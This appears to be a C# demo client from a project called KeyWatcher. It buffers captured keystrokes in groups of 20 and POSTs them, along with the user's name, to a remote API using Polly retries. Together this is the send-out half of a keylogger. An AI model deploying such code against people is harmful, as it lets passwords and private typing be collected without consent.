using KeyWatcher.Messages;
using Newtonsoft.Json;
using Polly;
using System;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace KeyWatcher.Signaled.Client
{
	class Program
	{
		private const int BufferSize = 20;
		private const int RetryCount = 4;
		private static readonly TimeSpan Retry = TimeSpan.FromMilliseconds(100);

		static async Task Main(string[] args)
		{
			await Console.Out.WriteLineAsync("Begin signaled client...");
			var userName = Common.GetUserName();
			var client = new HttpClient();
			var httpPolicy = Policy.Handle<HttpRequestException>(e =>
				{
					Console.WriteLine($"Could not call the service, sorry!");
					return true;
				}).WaitAndRetryAsync(
				Program.RetryCount, retryAttempt =>
				{
					Console.WriteLine($"Attempt {retryAttempt} of {Program.RetryCount} to call service...");
					return Program.Retry;
				});

			var keyLogger = new BufferedEventedKeyWatcher(Program.BufferSize);
			keyLogger.KeysLogged += async (s, e) =>
			{
				var message = JsonConvert.SerializeObject(
					new UserKeysMessage(userName, e.Keys.ToArray()), Formatting.Indented);
				var content = new StringContent(message,
					Encoding.Unicode, "application/json");

				await httpPolicy.ExecuteAsync(async () => await client.PostAsync(Common.ApiUri, content));
			};


			keyLogger.Listen();
		}
	}
}
